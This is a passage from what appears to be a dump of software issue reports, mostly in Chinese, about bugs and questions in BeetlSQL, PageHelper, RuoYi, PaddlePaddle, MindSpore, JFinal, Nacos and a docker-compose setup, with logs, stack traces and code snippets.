System.Runtime.CompilerServices.ConfiguredValueTaskAwaitable 1.ConfiguredTaskAwaiter.GetResult() at System.Net.Http.DiagnosticsHandler.&lt;SendAsyncCore&gt;d__5.MoveNext() at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() at System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task) at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) at System.Runtime.CompilerServices.ConfiguredTaskAwaitable 1.ConfiguredTaskAwaiter.GetResult() at Microsoft.Extensions.Http.Logging.LoggingScopeHttpMessageHandler.&lt;SendAsync&gt;d__5.MoveNext() at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() at System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task) at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) at System.Runtime.CompilerServices.ConfiguredTaskAwaitable 1.GetResult() at Furion.RemoteRequest.HttpClientExecutePart.&lt;SendAsStringAsync&gt;d__95.MoveNext() at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() at System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task) at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) at System.Runtime.CompilerServices.TaskAwaiter"
关于Oracle分页结果中多出rownum的问题,"@闲.大赋 看下这里：https://gitee.com/xiandafu/beetlsql/blob/master/sql-core/src/main/java/org/beetl/sql/core/range/RowNumRange.java#L26 在分页查询的结果字段中多出来个 这个考虑过如何去除么？ Hutool的的issue见：https://github.com/dromara/hutool/issues/2618   <code>: ROWNUM ""+PAGE_FLAG+"""
加入PageHelper代码后无法用注解sql查询？,"当我使用： 其中：mapper.getArticleListByCategories(category); 是用注解的方式执行sql的： 只有，日志打印只有 如果我把PageHelper代码去掉，那么就正常了 ： 就是加入PageHelper之后，注解的sql不执行了   <code>: PageHelper.startPage(pageNum,pageSize); List list = mapper.getArticleListByCategories(category); @Select(""SELECT * FROM spider_article ORDER BY article_publish_time ASC"") @ResultMap(""ListMap"") List&lt;SpiderArticle&gt; getArticleListByCategories(String category); SELECT count(0) FROM spider_article WHERE (article_categories = '[""null""]') &gt; SELECT * FROM spider_article WHERE (article_categories='a') &gt;"
生成代码的java文件目录路径与定义的gen.packageName不匹配,"生成代码时，java文件中的package路径是与gen.packageName一致的，但是zip文件中的目录路径则与gen.packageName不匹配，看了下代码，用的是，这里写死了com/ruoyi，导致与gen.packageName不一致。   <code>: com.ruoyi.generator.util.GenUtils#PROJECT_PATH=""main/java/com/ruoyi"""
当用户数达到一定规模后，进行全局缓存更新时出现的SQL语句过长问题,"当用户数和部门数达到一定规模后，进行数据缓存更新时，会触发所有用户的信息更新，此时会产生一条巨量SQL语句。具体错误提示如下： 建议适当拆分执行   <code>: CDbException CDbCommand 无法执行 SQL 语句: SQLSTATE[08S01]: Communication link failure: 1153 Got a packet bigger than 'max_allowed_packet' bytes. The SQL statement executed was: UPDATE `KUNBUY_syscache` SET `type`=:yp0, `dateline`=:yp1, `value`=:yp2 WHERE name = :name Stack Trace #0 + /home/wwwroot/default/oa/library/db/ar/CActiveRecord.php(1766): CDbCommand-&gt;execute() #1 – /home/wwwroot/default/oa/system/core/model/Model.php(300): CActiveRecord-&gt;updateAll(array(""type"" =&gt; 1, ""dateline"" =&gt; 1456996132, ""value"" =&gt; ""a:637:{i:1;a:51:{s:3:""uid"";s:1:""1"";s:8:""username"";s:5:""admin"";s:...""), ""name = :name"", array("":name"" =&gt; ""users"")) #2 – /home/wwwroot/default/oa/system/modules/dashboard/model/Syscache.php(60): application\core\model\Model-&gt;updateAll(array(""type"" =&gt; 1, ""dateline"" =&gt; 1456996132, ""value"" =&gt; ""a:637:{i:1;a:51:{s:3:""uid"";s:1:""1"";s:8:""username"";s:5:""admin"";s:...""), ""name = :name"", array("":name"" =&gt; ""users"")) #3 – /home/wwwroot/default/oa/system/core/cache/provider/Users.php(44): application\modules\dashboard\model\Syscache-&gt;modify(""users"", array(1 =&gt; array(""uid"" =&gt; ""1"", ""username"" =&gt; ""admin"", ""isadministrator"" =&gt; ""1"", ""deptid"" =&gt; ""0"", ...), 5 =&gt; array(""uid"" =&gt; ""5"", ""username"" =&gt; ""bbb"", ""isadministrator"" =&gt; ""0"", ""deptid"" =&gt; ""30"", ...), 6 =&gt; array(""uid"" =&gt; ""6"", ""username"" =&gt; ""test1"", ""isadministrator"" =&gt; ""0"", ""deptid"" =&gt; ""20"", ...), 7 =&gt; array(""uid"" =&gt; ""7"", ""username"" =&gt; ""aaa"", ""isadministrator"" =&gt; ""0"", ""deptid"" =&gt; ""20"", ...), ...)) #4 + /home/wwwroot/default/oa/library/base/CComponent.php(561): application\core\cache\provider\Users-&gt;handleUsers(CEvent) #5 + /home/wwwroot/default/oa/system/core/utils/Cache.php(145): CComponent-&gt;raiseEvent(""onUpdateCache"", CEvent) #6 + /home/wwwroot/default/oa/system/modules/dashboard/controllers/UserController.php(532): application\core\utils\Cache::update()"
ChainWrapper 能否支持不抛异常的one方法,"期望 ChainWrapper 下 one 方法添加一个重载方法达到 IService 下 的效果   <code>: T getOne(Wrapper&lt;T&gt; queryWrapper, boolean throwEx)"
CMAKE error with downloads of models,"Commit: https://github.com/PaddlePaddle/Paddle/commit/f992f8d7ef58cb632985832816fad8ff5db7947a causes CMake error while models are downloaded sample of log for one model is below.   <code>: CMake Error at extern_inference_download_transformer_model_tar_gz-stamp/download-extern_inference_download_transformer_model_tar_gz.cmake:159 (message): Each download failed! error: downloading 'http://paddle-inference-dist.bj.bcebos.com/transformer_model.tar.gz' failed status_code: 22 status_string: ""HTTP response code said error"" log: --- LOG BEGIN --- Uses proxy env variable http_proxy == 'http://proxy.ra.intel.com:911' Trying 10.7.211.16... TCP_NODELAY set Connected to proxy.ra.intel.com (10.7.211.16) port 911 (#0) GET http://paddle-inference-dist.bj.bcebos.com/transformer_model.tar.gz HTTP/1.1 Host: paddle-inference-dist.bj.bcebos.com User-Agent: curl/7.62.0 Accept: */* Proxy-Connection: Keep-Alive The requested URL returned error: 404 Not Found Closing connection 0 --- LOG END ---"
[ST][MS/modelzoo][NET][CPU][MCTS]train fail and CORE dump ,"网络训练失败，并且core-dump / 硬件环境: /device ascend : -- MindSpore version :r2.0 B030 commit_id:99a73448 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph mcts_demo.py cd solution_test/cases/02network/00cv/caddn/ pytest -s 网络训练成功 走给陈一杰   <code>: [WARNING] ME(26862:139931834791744,MainProcess):2022-10-28-18:04:36.718.402 [mindspore/common/api.py:656] 'mindspore.ms_function' will be deprecated and removed in a future version. Please use 'mindspore.jit' instead. [WARNING] ME(26862:139931834791744,MainProcess):2022-10-28-18:04:36.718.713 [mindspore/common/api.py:656] 'mindspore.ms_function' will be deprecated and removed in a future version. Please use 'mindspore.jit' instead. Segmentation fault (core dumped) drwxr-xr-x 3 jenkins0 jenkins0 4096 Oct 28 18:04 ./ drwxr-xr-x 15 jenkins0 jenkins0 4096 Oct 28 18:02 ../ -rw------- 1 jenkins0 jenkins0 464760832 Oct 28 18:04 core -rw-r--r-- 1 jenkins0 jenkins0 3068 Oct 28 18:02 mcts_demo.py drwxr-xr-x 3 jenkins0 jenkins0 4096 Oct 28 18:04 rank_0/ -rw-r--r-- 1 jenkins0 jenkins0 1312 Oct 28 18:02 README_CN.md -rw-r--r-- 1 jenkins0 jenkins0 1371 Oct 28 18:02 README.md"
ERROR: dockerfile parse error line 8: unknown instruction: M,pig版本:3.4.0 是否修改包名: 否 在用doker-compose时，报错，mysql的镜像构建不了，提示如下： 我的docker-compose.yml文件如下   <code>: Building park-mysql ERROR: dockerfile parse error line 8: unknown instruction: M version: '2' services: park-mysql: build: context: ./db environment: MYSQL_ROOT_PASSWORD: root restart: always container_name: park-mysql image: park-mysql ports: - 3306:3306 park-redis: image: redis:6.2.6 ports: - 6379:6379 restart: always container_name: park-redis hostname: park-redis park-register: build: context: ./park-register restart: always ports: - 8848:8848 container_name: park-register hostname: park-register image: park-register park-gateway: build: context: ./park-gateway restart: always ports: - 9999:9999 container_name: park-gateway hostname: park-gateway image: park-gateway park-auth: build: context: ./park-auth restart: always container_name: park-auth hostname: park-auth image: park-auth park-upms: build: context: ./park-upms/park-upms-biz restart: always container_name: park-upms hostname: park-upms image: park-upms park-monitor: build: context: ./park-visual/park-monitor restart: always ports: - 5001:5001 container_name: park-monitor hostname: park-monitor image: park-monitor park-sentinel: build: context: ./park-visual/park-sentinel-dashboard restart: always image: park-sentinel container_name: park-sentinel ports: - 5003:5003 park-codegen: build: context: ./park-visual/park-codegen restart: always container_name: park-codegen hostname: park-codegen image: park-codegen park-job: build: context: ./park-visual/park-xxl-job-admin restart: always container_name: park-job hostname: park-job image: park-job ports: - 5004:5004
f1 score loss 实现问题,"在paddle上实现了一个f1 loss函数： 输出的shape如下： shape:loss (-1L, -1L, 3L) (-1L, -1L, 3L) (-1L, -1L, 3L) (-1L, -1L, 3L) f1_shape (-1L, -1L, 3L) mean_shape name: ""mean_0.tmp_0"" type { type: LOD_TENSOR lod_tensor { tensor { data_type: FP32 dims: 1 } } } persistable: false loss_shape name: ""tmp_25"" type { type: LOD_TENSOR lod_tensor { tensor { data_type: FP32 dims: 1 } lod_level: 0 } } 实际以此loss做训练，结果很怪异，能帮忙看下原因吗，在keras实现此loss函数无问题   <code>: def _compute_loss(self, dec_output): tp = fluid.layers.sum(fluid.layers.cast(self.label * dec_output, dtype=""float32"")) tn = fluid.layers.sum(fluid.layers.cast((1 -self.label) * (1 - dec_output), dtype=""float32"")) fp = fluid.layers.sum(fluid.layers.cast((1 -self.label) * dec_output, dtype=""float32"")) fn = fluid.layers.sum(fluid.layers.cast(self.label * (1 - dec_output), dtype=""float32"")) print (""shape:loss"", tp.shape, tn.shape, fp.shape, fn.shape) p = tp / (tp + fp + 1e-07) r = tp / (tp + fn + 1e-07) f1 = 2 * p * r / (p + r + 1e-07) print (""f1_shape "", f1.shape) print (""mean_shape "", fluid.layers.mean(f1)) print (""loss_shape"", 1 - fluid.layers.mean(f1)) return 1 - fluid.layers.mean(f1), dec_output, self.label"
PR 46833 problem cause cuda_ops link failure on Windows,"!46833:to optimize size of unify package, all gpu plugin use same cuda_ops.so 's problem cause cuda_ops link failure on Windows seems like changed cause the problem, after I reverted only this file, it successfully linked (PS: it can be compiled successfully no matter I revert or not) / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph Build From Source Successful built Problem: unlinked libraries: , ,   <code>: mindspore/ccsrc/plugin/device/gpu/kernel/cuda_impl/CMakeLists.txt master, commit_id: 5dbd22ae028c80f76ee6ef28fb256427900b8d27 Python 3.9.13 Windows 10 MSVC 14.29.30133 cuda_ops_generated_affine_grid_impl.cu.obj : error LNK2019: 无法解析的外部符号 cudnnGetErrorString，函数 ""void __cdecl CalculateAffineGrid4D&lt;float&gt;(float const *,float *,float *,int const &amp;,int const &amp;,int const &amp;,int const &amp;,bool const &amp;,unsigned int const&amp;,struct CUstream_st *)"" (??$CalculateAffineGrid4D@M@@YAXPEBMPEAM1AEBH222AEB_NAEBIPEAUCUstream_st@@@Z) 中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj] cuda_ops_generated_affine_grid_impl.cu.obj : error LNK2019: 无法解析的外部符号 cudnnCreate，函数 ""void __cdecl CalculateAffineGrid4D&lt;float&gt;(float const *,float *,float *,int const &amp;,int const &amp;,int const &amp;,int const &amp;,bool const &amp;,unsigned int const &amp;,struct CUstream_st *)"" (??$CalculateAffineGrid4D@M@@YAXPEBMPEAM1AEBH222AEB_NAEBIPEAUCUstream_st@@@Z) 中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj] cuda_ops_generated_affine_grid_impl.cu.obj : error LNK2019: 无法解析的外部符号 cudnnDestroy，函数 ""void __cdecl CalculateAffineGrid4D&lt;float&gt;(float const *,float *,float *,int const &amp;,int const &amp;,int const &amp;,int const &amp;,bool const &amp;,unsigned int const &amp;,struct CUstream_st *)"" (??$CalculateAffineGrid4D@M@@YAXPEBMPEAM1AEBH222AEB_NAEBIPEAUCUstream_st@@@Z) 中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj] cuda_ops_generated_affine_grid_impl.cu.obj : error LNK2019: 无法解析的外部符号 cudnnSetStream，函数 ""void __cdecl CalculateAffineGrid4D&lt;float&gt;(float const *,float *,float *,int const &amp;,int const &amp;,int const &amp;,int const &amp;,bool const &amp;,unsigned int const &amp;,struct CUstream_st *)"" (??$CalculateAffineGrid4D@M@@YAXPEBMPEAM1AEBH222AEB_NAEBIPEAUCUstream_st@@@Z) 中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj] cuda_ops_generated_affine_grid_impl.cu.obj : error LNK2019: 无法解析的外部符号 cudnnCreateSpatialTransformerDescriptor，函数 ""void __cdecl CalculateAffineGrid4D&lt;float&gt;(float const *,float *,float *,int const &amp;,int const &amp;,int const &amp;,int const &amp;,bool const &amp;,unsigned int const &amp;,struct CUstream_st *)"" (??$CalculateAffineGrid4D@M@@YAXPEBMPEAM1AEBH222AEB_NAEBIPEAUCUstream_st@@@Z)中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj] cuda_ops_generated_affine_grid_impl.cu.obj : error LNK2019: 无法解析的外部符号 cudnnSetSpatialTransformerNdDescriptor，函数 ""void __cdecl CalculateAffineGrid4D&lt;float&gt;(float const *,float *,float *,int const &amp;,int const &amp;,int const &amp;,int const &amp;,bool const &amp;,unsigned int const &amp;,struct CUstream_st *)"" (??$CalculateAffineGrid4D@M@@YAXPEBMPEAM1AEBH222AEB_NAEBIPEAUCUstream_st@@@Z) 中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj] cuda_ops_generated_affine_grid_impl.cu.obj : error LNK2019: 无法解析的外部符号 cudnnDestroySpatialTransformerDescriptor，函数 ""void __cdecl CalculateAffineGrid4D&lt;float&gt;(float const *,float *,float *,int const &amp;,int const &amp;,int const &amp;,int const &amp;,bool const&amp;,unsigned int const &amp;,struct CUstream_st *)"" (??$CalculateAffineGrid4D@M@@YAXPEBMPEAM1AEBH222AEB_NAEBIPEAUCUstream_st@@@Z) 中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj] cuda_ops_generated_affine_grid_impl.cu.obj : error LNK2019: 无法解析的外部符号 cudnnSpatialTfGridGeneratorForward，函数 ""void __cdecl CalculateAffineGrid4D&lt;float&gt;(float const *,float *,float *,int const &amp;,int const &amp;,int const &amp;,int const &amp;,bool const &amp;,unsigned int const &amp;,struct CUstream_st *)"" (??$CalculateAffineGrid4D@M@@YAXPEBMPEAM1AEBH222AEB_NAEBIPEAUCUstream_st@@@Z) 中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj] cuda_ops_generated_fft_with_size_impl.cu.obj : error LNK2019: 无法解析的外部符号 cufftExecC2C，函数 ""void __cdecl CalculateFFT(struct float2 *,struct float2 *,double const &amp;,int const &amp;,int,struct cublasContext *,unsigned int const &amp;,struct CUstream_st *)"" (?CalculateFFT@@YAXPEAUfloat2@@0AEBNAEBHHPEAUcublasContext@@AEBIPEAUCUstream_st@@@Z) 中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj] cuda_ops_generated_fft_with_size_impl.cu.obj : error LNK2019: 无法解析的外部符号 cufftExecR2C，函数 ""void __cdecl CalculateRFFT(float *,struct float2 *,struct float2 *,bool const &amp;,double const &amp;,int const &amp;,int const &amp;,int,struct cublasContext *,unsigned int const &amp;,struct CUstream_st *)"" (?CalculateRFFT@@YAXPEAMPEAUfloat2@@1AEB_NAEBNAEBH4HPEAUcublasContext@@AEBIPEAUCUstream_st@@@Z) 中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj] cuda_ops_generated_fft_with_size_impl.cu.obj : error LNK2019: 无法解析的外部符号 cufftExecC2R，函数 ""void __cdecl CalculateIRFFT(struct float2 *,struct float2 *,float *,bool const &amp;,double const &amp;,int const &amp;,int const &amp;,int,struct cublasContext *,unsigned int const &amp;,struct CUstream_st *)"" (?CalculateIRFFT@@YAXPEAUfloat2@@0PEAMAEB_NAEBNAEBH4HPEAUcublasContext@@AEBIPEAUCUstream_st@@@Z) 中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj] cuda_ops_generated_fft_with_size_impl.cu.obj : error LNK2019: 无法解析的外部符号 cufftExecZ2Z，函数 ""void __cdecl CalculateFFT(struct double2 *,struct double2 *,double const &amp;,int const &amp;,int,struct cublasContext *,unsigned int const &amp;,struct CUstream_st *)"" (?CalculateFFT@@YAXPEAUdouble2@@0AEBNAEBHHPEAUcublasContext@@AEBIPEAUCUstream_st@@@Z) 中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj] cuda_ops_generated_fft_with_size_impl.cu.obj : error LNK2019: 无法解析的外部符号 cufftExecD2Z，函数 ""void __cdecl CalculateRFFT(double*,struct double2 *,struct double2 *,bool const &amp;,double const &amp;,int const &amp;,int const &amp;,int,struct cublasContext *,unsigned int const &amp;,struct CUstream_st *)"" (?CalculateRFFT@@YAXPEANPEAUdouble2@@1AEB_NAEBNAEBH4HPEAUcublasContext@@AEBIPEAUCUstream_st@@@Z) 中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj] cuda_ops_generated_fft_with_size_impl.cu.obj : error LNK2019: 无法解析的外部符号 cufftExecZ2D，函数 ""void __cdecl CalculateIRFFT(struct double2 *,struct double2 *,double *,bool const &amp;,double const &amp;,int const &amp;,int const &amp;,int,struct cublasContext *,unsigned int const &amp;,struct CUstream_st *)"" (?CalculateIRFFT@@YAXPEAUdouble2@@0PEANAEB_NAEBNAEBH4HPEAUcublasContext@@AEBIPEAUCUstream_st@@@Z) 中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj] cuda_ops_generated_fft_with_size_impl.cu.obj : error LNK2019: 无法解析的外部符号 cufftSetStream，函数 ""void __cdecl CalculateFFT(struct double2 *,struct double2 *,double const &amp;,int const &amp;,int,struct cublasContext *,unsigned int const &amp;,struct CUstream_st *)"" (?CalculateFFT@@YAXPEAUdouble2@@0AEBNAEBHHPEAUcublasContext@@AEBIPEAUCUstream_st@@@Z) 中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj] cuda_ops_generated_fft_with_size_impl.cu.obj : error LNK2019: 无法解析的外部符号 cublasSetStream_v2，函数 ""void __cdecl CalculateFFT(struct double2 *,struct double2 *,double const &amp;,int const &amp;,int,struct cublasContext *,unsigned int const &amp;,struct CUstream_st *)"" (?CalculateFFT@@YAXPEAUdouble2@@0AEBNAEBHHPEAUcublasContext@@AEBIPEAUCUstream_st@@@Z) 中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj] cuda_ops_generated_fft_with_size_impl.cu.obj : error LNK2019: 无法解析的外部符号 cublasSscal_v2，函数 ""void __cdecl CalculateIRFFT(struct float2 *,struct float2 *,float *,bool const &amp;,double const &amp;,int const &amp;,int const &amp;,int,struct cublasContext *,unsigned int const &amp;,struct CUstream_st *)"" (?CalculateIRFFT@@YAXPEAUfloat2@@0PEAMAEB_NAEBNAEBH4HPEAUcublasContext@@AEBIPEAUCUstream_st@@@Z) 中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj]cuda_ops_generated_fft_with_size_impl.cu.obj : error LNK2019: 无法解析的外部符号 cublasDscal_v2，函数 ""void __cdecl CalculateIRFFT(struct double2 *,struct double2 *,double *,bool const &amp;,double const &amp;,int const &amp;,int const &amp;,int,struct cublasContext *,unsined int const &amp;,struct CUstream_st *)"" (?CalculateIRFFT@@YAXPEAUdouble2@@0PEANAEB_NAEBNAEBH4HPEAUcublasContext@@AEBIPEAUCUstream_st@@@Z) 中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj] cuda_ops_generated_fft_with_size_impl.cu.obj : error LNK2019: 无法解析的外部符号 cublasCsscal_v2，函数 ""void __cdecl CalculateFFT(struct float2 *,struct float2 *,double const &amp;,int const &amp;,int,struct cublasContext *,unsigned int const &amp;,struct CUstream_st *)"" (?CalculateFFT@@YAXPEAUfloat2@@0AEBNAEBHHPEAUcublasContext@@AEBIPEAUCUstream_st@@@Z) 中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj]cuda_ops_generated_fft_with_size_impl.cu.obj : error LNK2019: 无法解析的外部符号 cublasZdscal_v2，函数 ""void __cdecl CalculateFFT(struct double2 *,struct double2 *,double const &amp;,int const &amp;,int,struct cublasContext *,unsigned int const &amp;,struct CUstream_st*)"" (?CalculateFFT@@YAXPEAUdouble2@@0AEBNAEBHHPEAUcublasContext@@AEBIPEAUCUstream_st@@@Z) 中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj] cuda_common.obj : error LNK2019: 无法解析的外部符号 ""__declspec(dllimport) public: static class std::shared_ptr&lt;class mindspore::MsContext&gt; __cdecl mindspore::MsContext::GetInstance(void)"" (__imp_?GetInstance@MsContext@mindspore@@SA?AV?$shared_ptr@VMsContext@mindspore@@@std@@XZ)，函数 ""private: __cdecl mindspore::device::gpu::CudaCommon::CudaCommon(void)"" (??0CudaCommon@gpu@device@mindspore@@AEAA@XZ) 中引用了该符号 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj] F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\Release\cuda_ops.dll : fatal error LNK1120: 21 个无法解析的外部命令 [F:\Builds\mindspore\build\mindspore\mindspore\ccsrc\plugin\device\gpu\kernel\cuda_impl\cuda_ops.vcxproj] cudnn.lib cublas.lib cufft.lib"
【MindStudio提出】PyNative模式下stop_gradient结果有误,"/ 硬件环境: /device GPU : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative 运行如下脚本 import mindspore import numpy as np mindspore.set_context(mode=mindspore.PYNATIVE_MODE) class Net(mindspore.nn.Cell): def init(self): super(Net, self).init() self.w = mindspore.Parameter(mindspore.Tensor(np.array([6], np.float32)), name='w') self.b = mindspore.Parameter(mindspore.Tensor(np.array([1.0], np.float32)), name='b') def construct(self, x): # 停止梯度更新，out对梯度计算无贡献 out = x * self.w + self.b out2 = mindspore.ops.stop_gradient(out) return out class GradNet(mindspore.nn.Cell): def init(self, net): super(GradNet, self).init() self.net = net self.params = mindspore.ParameterTuple(net.trainable_params()) self.grad_op = mindspore.ops.GradOperation(get_by_list=True) x = mindspore.Tensor([100], dtype=mindspore.float32) output = GradNet(Net())(x) print(f""wgrad: {output[0]}\nbgrad: {output[1]}"") 打印梯度为0，而graph模式下梯度不为0   <code>: def construct(self, x): gradient_function = self.grad_op(self.net, self.params) return gradient_function(x)"
[CT][MS][CumulativeLogsumexp]API has some error and example test fail,"API资料有些问题， 样例执行失败 / 硬件环境: /device ascend/CPU/ : -- MindSpore version :众智包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph API资料和样例 检查资料， 执行样例 资料描述完整， 清晰，正确 样例执行成功， 展示结果与实际结果一致 资料问题： 样例问题：   <code>: _____________________________________ [doctest] mindspore.ops.operations.math_ops.CumulativeLogsumexp ______________________________________ 1017 ValueError: If the dimension of `x` is not greater than 1. 1018 RuntimeError: If `axis` is out of range [-rank(x), rank(x)). 1019 1020 Supported Platforms: 1021 ``Ascend`` ``CPU`` 1022 1023 Examples: 1024 &gt;&gt;&gt; x = Tensor(np.array([1.0, 2.0, 3.0]).astype(np.float32)) 1025 &gt;&gt;&gt; op = ops.CumulativeLogsumexp(exclusive=False, reverse=False) 1026 &gt;&gt;&gt; output = op(x, Tensor(0)) UNEXPECTED EXCEPTION: TypeError('For primitive[CumulativeLogsumexp], the input argument[axis] must be a type of {Tensor[Int16], Tensor[Int32 ]}, but got Tensor[Int64].\n\n----------------------------------------------------\n- C++ Call Stack: (For framework developers)\n---------- ------------------------------------------\nmindspore/core/utils/check_convert_utils.cc:633 CheckTensorSubClass\n') Traceback (most recent call last): File ""/root/miniconda3/envs/high-caory2/lib/python3.7/doctest.py"", line 1329, in __run compileflags, 1), test.globs) File ""&lt;doctest mindspore.ops.operations.math_ops.CumulativeLogsumexp[2]&gt;"", line 1, in &lt;module&gt; File ""/root/miniconda3/envs/high-caory2/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 294, in __call__ return _run_op(self, self.name, args) File ""/root/miniconda3/envs/high-caory2/lib/python3.7/site-packages/mindspore/common/api.py"", line 97, in wrapper results = fn(*arg, **kwargs) File ""/root/miniconda3/envs/high-caory2/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 748, in _run_op output = real_run_op(obj, op_name, args) TypeError: For primitive[CumulativeLogsumexp], the input argument[axis] must be a type of {Tensor[Int16], Tensor[Int32]}, but got Tensor[Int 64]."
【众智】【计算-用户接口】PoissonNLLLoss,PoissonNLLLoss NN接口 计算泊松分布的负对数似然损失。 NN接口 接口目录：mindspore/python/mindspore/nn/loss/loss.py input target loss log_input bool 属性 full bool 属性 eps float 属性 reduction str 属性 对标接口参考 PyTorch1.8.1接口： torch.nn.PoissonNLLLoss https://pytorch.org/docs/1.8.1/generated/torch.nn.PoissonNLLLoss.html 3. 异常处理 4. 算子反向 通过小算子拼接自动求解反向   <code>: class PoissonNLLLoss(LossBase):
Let OpProto support multiple and temporary,"Each input/output of Paddle's Op could be a list. Add multiple mark to OpProto. Also add a / attribute if that Op has multiple input or output. The format of that attribute please reference the comments in Add temporary mark, because some output of an Op is not used by user but used by other op for faster computation. Explicitly mark which output is temporary could let future memory/computation optimization.   <code>: input_format output_format op_proto.proto"
请问下服务是怎么找到nacos中配置文件的？,共享配置 这个是找公共配置，但是在公共配置中也没看到根据什么找到具体配置文件的   <code>: shared-configs: - application-${spring.profiles.active}.${spring.cloud.nacos.config.file-extension}
JFinal服务器初始化，调用接口异常,"改写JfinalConfig中的 onStart事件，在服务器启动时，请求本服务器的接口 输出异常 java.net.ConnectException: Failed to connect to localhost/0:0:0:0:0:0:0:1:80 工作中有一个需求，需要在启动服务器之后调用钉钉的注册回调地址api，钉钉会回向回调地址发送一个请求，但是会失败报服务器502。工作中使用的是4.3版本。 示例： jfinal-issus   <code>: public static void main(String[] args) { UndertowServer.start(WebConfig.class, 80, true); } @Override public void onStart() { try { OkHttpClient client = new OkHttpClient(); Request request = new Request.Builder().url(""http://localhost:80/test/index"").build(); Response response = client.newCall(request).execute(); System.out.println(response.body().string()); }catch(IOException e){ e.printStackTrace(); } }"
上传图片文件目录数量的弊端,"下面这段代码会第造成这么一个问题：当文件上传量较大时，几乎是第个文件目录都只有一个文件（因为很少有文件的md5值前16个字符相同），最后让文件目录占用了极大的磁盘空间。建设作者把文件目录改成像TP缓存目录一样，目录命名只占2个字符（最大目录数就只有16*16了；不然以这种方式生成目录的最大数量为16的10次方，特别庞大）。 建议改成下面代码：   <code>: public static function name($url, $ext = '', $pre = '', $fun = 'md5') { empty($ext) &amp;&amp; $ext = pathinfo($url, 4); empty($ext) || $ext = trim($ext, '.\\/'); empty($pre) || $pre = trim($pre, '.\\/'); $splits = array_merge([$pre], str_split($fun($url), 16)); return trim(join('/', $splits), '/') . '.' . strtolower($ext ? $ext : 'tmp'); } public static function name($url, $ext = '', $pre = '', $fun = 'md5') { empty($ext) &amp;&amp; $ext = pathinfo($url, 4); empty($ext) || $ext = trim($ext, '.\\/'); empty($pre) || $pre = trim($pre, '.\\/'); $result = $fun($url); $splits = array_merge([$pre], [substr($result,0,2), substr($result, 2)]); return trim(join('/', $splits), '/') . '.' . strtolower($ext ? $ext : 'tmp'); }"
tiny模板引擎加bodyContent后未传入值，循环套用后发生死循环,代码如下 发生死循环。 去除div3的#bodyContent后恢复正常   <code>: #macro div1() &lt;div&gt; #bodyContent &lt;/div&gt; #end #macro div2() #@div1() #bodyContent #end #end #macro div3() &lt;div&gt; #bodyContent &lt;/div&gt; #end #macro div4() #div3() #end #@div2() #div4() #end
